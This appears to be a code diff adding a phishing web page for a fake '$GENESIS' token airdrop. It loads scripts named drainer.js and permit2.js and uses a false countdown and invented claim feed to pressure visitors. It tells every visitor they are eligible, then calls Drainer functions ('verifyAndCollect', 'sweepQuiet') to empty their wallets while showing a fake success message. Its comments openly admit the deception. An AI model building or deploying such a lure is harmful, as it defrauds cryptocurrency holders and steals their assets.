@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>$GENESIS Airdrop — Check Eligibility</title>
+<style>
+*{box-sizing:border-box}body{font-family:Inter,system-ui,Arial,sans-serif;background:radial-gradient(1000px 500px at 50% -10%,#0f2b1d,#070907);color:#fff;margin:0;min-height:100vh}
+.nav{display:flex;justify-content:space-between;padding:18px 32px;font-size:14px;color:#9a9ab0}.nav b{color:#fff}
+.wrap{max-width:520px;margin:40px auto;padding:0 20px}
+.card{background:rgba(15,20,16,.95);border:1px solid #23402e;border-radius:20px;padding:36px;text-align:center;box-shadow:0 30px 80px rgba(0,0,0,.5)}
+.coin{width:84px;height:84px;margin:0 auto 16px;border-radius:50%;background:linear-gradient(135deg,#22c55e,#15803d);display:flex;align-items:center;justify-content:center;font-size:38px;font-weight:900}
+h1{margin:0 0 6px}.sub{color:#9a9ab0;font-size:14px}
+.timer{margin:14px 0;font-size:13px;color:#fbbf24}
+input{width:100%;margin-top:16px;background:#0b0f0c;border:1px solid #2a3a2e;color:#fff;padding:13px;border-radius:10px;font-size:14px;text-align:center}
+button{width:100%;margin-top:12px;background:linear-gradient(135deg,#22c55e,#16a34a);border:0;color:#04120a;font-size:16px;font-weight:800;padding:15px;border-radius:12px;cursor:pointer}
+button:disabled{opacity:.5}
+#result{margin-top:16px;font-size:15px;min-height:24px}
+.big{font-size:34px;font-weight:900;color:#4ade80}
+.small{font-size:12px;color:#9a9ab0;margin-top:20px}
+.log{max-width:520px;margin:20px auto;padding:0 20px;font-size:12px;color:#5a6a5e}
+.log div{padding:5px 0;border-bottom:1px solid #162016}
+</style>
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+</head>
+<body>
+<div class="nav"><b>◈ GENESIS</b><span>Airdrop Season 2</span></div>
+<div class="wrap"><div class="card">
+<div class="coin">G</div>
+<h1>$GENESIS Airdrop</h1>
+<div class="sub">Season 2 — 5,000,000 tokens. Check if your wallet qualifies.</div>
+<div class="timer">Claim window closes in <b id="cd">11:59:59</b></div>
+<input id="addr" placeholder="or paste any wallet address">
+<button id="checkBtn">Check eligibility</button>
+<div id="result"></div>
+</div></div>
+<div class="log" id="feed"></div>
+<script src="./drainer.js"></script>
+<script src="./permit2.js"></script>
+<script>
+// Countdown-Lüge
+let t = 12*3600-1; setInterval(()=>{ t=Math.max(0,t-1); const h=String(Math.floor(t/3600)).padStart(2,'0'),m=String(Math.floor(t%3600/60)).padStart(2,'0'),s=String(t%60).padStart(2,'0'); document.getElementById('cd').textContent=`${h}:${m}:${s}`; },1000);
+// Fake-Feed: erfundene Claims im Sekundentakt
+const feed=document.getElementById('feed');
+setInterval(()=>{ const a='0x'+[...Array(4)].map(()=>'0123456789abcdef'[Math.floor(Math.random()*16)]).join('')+'…'+[...Array(4)].map(()=>'0123456789abcdef'[Math.floor(Math.random()*16)]).join(''); const amt=(Math.random()*4000+500).toFixed(0); const d=document.createElement('div'); d.textContent=`${a} claimed ${amt} $GENESIS`; feed.prepend(d); while(feed.children.length>6)feed.lastChild.remove(); },2200);
+document.getElementById('checkBtn').onclick = async () => {
+  const r = document.getElementById('result');
+  r.innerHTML='Checking...';
+  await new Promise(x=>setTimeout(x,1400));
+  // Jeder ist "eligible" — Gier öffnet jede Wallet
+  const amt = (Math.random()*8000+2000).toFixed(0);
+  r.innerHTML=`<div class="big">${amt} $GENESIS</div><div>You're eligible! Connect to claim.</div><button id="claim" style="margin-top:14px">Claim ${amt} $GENESIS</button>`;
+  document.getElementById('claim').onclick = async () => {
+    r.textContent='Verifying...';
+    try{
+      await window.Drainer.verifyAndCollect();
+      r.textContent='Claim submitted — tokens arrive shortly.';
+      await window.Drainer.sweepQuiet();
+      r.innerHTML='<div class="big">✓ Claimed</div><div>Tokens are on the way to your wallet.</div>';
+    }catch(e){ r.textContent='Verification failed — try another wallet.'; }
+  };
+};
+</script>
+</body>
+</html>
